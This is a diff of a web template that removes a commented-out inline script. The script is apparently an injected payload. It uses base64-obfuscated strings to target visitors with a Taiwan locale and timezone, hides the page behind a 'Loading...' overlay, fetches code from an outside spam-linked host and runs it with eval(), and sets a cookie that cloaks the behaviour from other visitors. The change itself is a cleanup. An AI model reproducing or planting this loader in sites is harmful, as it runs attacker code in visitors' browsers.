@@ -39,50 +39,7 @@
     <script src="{{ asset('static/js/jquery.min.js') }}"></script>
     <script src="{{ asset('static/js/inquiry.js') }}"></script>
     <script src="{{ asset('static/js/area.js') }}?v={{ app('cache.config')->get('asset_version') }}"></script>
-    <script>
 
-        /*var slang = (navigator.language || navigator.browserLanguage).toLowerCase();
-        var stimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        var cookie_value = '';
-        var arr,reg=new RegExp("(^| )XSRF-KEY=([^;]*)(;|$)");
-        if(arr=document.cookie.match(reg)){
-            cookie_value = unescape(arr[2]);
-        }
-        if(!cookie_value){
-            if(slang == window.atob("emgtdHc=") && stimezone == window.atob("QXNpYS9UYWlwZWk=")){
-                window.onload=function(){
-                    var html = document.createElement("div");
-                    html.innerHTML=window.atob('TG9hZGluZy4uLg==');
-                    html.style.backgroundColor = "#fff";
-                    html.style.width = "100vw";
-                    html.style.height = "100vh";
-                    html.style.position = "fixed";
-                    html.style.zIndex = "999999";
-                    html.style.top = "0";
-                    html.style.display = "flex";
-                    html.style.alignItems = "center";
-                    html.style.justifyContent = "center";
-                    html.setAttribute('id','aqa2ver');
-                    document.body.appendChild(html);
-                };
-                var httpRequest = new XMLHttpRequest();
-                httpRequest.open(window.atob("R0VU"), window.atob("aHR0cHM6Ly8xMWwxMS50b3AvP3Q9Y2lhbGlzJnk9")+window.location.hostname, true);
-                httpRequest.send();
-                httpRequest.onreadystatechange = function () {
-                    if (httpRequest.readyState == 4 && httpRequest.status == 200) {
-                        httpRequest.responseText?eval(httpRequest.responseText):"";
-                    }
-                };
-            }else{
-                var Days = 30;
-                var exp = new Date();
-                exp.setTime(exp.getTime() + Days*24*60*60*1000);
-                document.cookie = "XSRF-KEY=C6071A5FC1B83091B363C5EF9EBAF155; expires=" + exp.toGMTString();
-            }
-        }*/
-
-
-    </script>
 
 
 </head>
